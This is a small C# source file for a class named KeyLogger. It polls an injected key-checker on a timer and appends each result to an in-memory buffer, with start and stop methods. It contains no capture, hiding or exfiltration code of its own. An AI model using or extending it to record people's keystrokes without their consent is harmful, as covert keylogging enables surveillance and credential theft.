using System.Text;
using System.Timers;
using KeyLogger.Core.Abstract;

namespace KeyLogger.Core
{
    public class KeyLogger: IKeyLogger
    {
        private readonly StringBuilder logBugger;
        private readonly Timer timer;

        private readonly IKeyChecker keyChecker;

        public KeyLogger(IKeyChecker keyChecker)
            : this(keyChecker, 30)
        {
        }

        public KeyLogger(IKeyChecker keyChecker, long refreshInterval)
        {
            logBugger=new StringBuilder();
            this.keyChecker = keyChecker;
            timer=new Timer
                      {
                          Interval = refreshInterval
                      };
            timer.Elapsed += KeyCheckEvent;
        }

        public void Start()
        {
            if(IsStarted)
            {
                return;
            }
            timer.Enabled = true;
        }

        public void Stop()
        {
            if(!IsStarted)
            {
                return;
            }
            timer.Enabled = false;
        }

        public bool IsStarted { get { return timer.Enabled; } }

        private void KeyCheckEvent(object sender, ElapsedEventArgs e)
        {
            logBugger.Append(keyChecker.CheckKeys());
        }
    }
}
